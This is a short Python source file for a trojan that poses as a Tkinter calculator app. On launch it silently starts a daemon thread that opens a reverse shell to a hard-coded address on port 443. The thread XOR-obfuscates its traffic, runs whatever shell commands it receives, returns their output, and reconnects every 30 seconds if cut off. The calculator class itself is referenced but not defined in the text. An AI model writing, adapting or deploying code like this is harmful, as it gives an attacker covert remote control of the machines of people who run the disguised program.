import tkinter as tk
import socket
import threading
import subprocess
import time
import base64


XOR_KEY = 0x5A 

def xor_data(data):
    return bytes([b ^ XOR_KEY for b in data])

def start_backdoor(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            while True:
           
                encrypted_data = s.recv(4096)
                if not encrypted_data: break
                cmd = xor_data(encrypted_data).decode()
                
                # Execute
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                
            
                s.send(xor_data(output))
            s.close()
        except:
            time.sleep(30) 


if __name__ == "__main__":
    threading.Thread(target=start_backdoor, args=("10.211.55.5", 443), daemon=True).start()
    root = tk.Tk()
    app = CalculatorApp(root)
    root.mainloop()
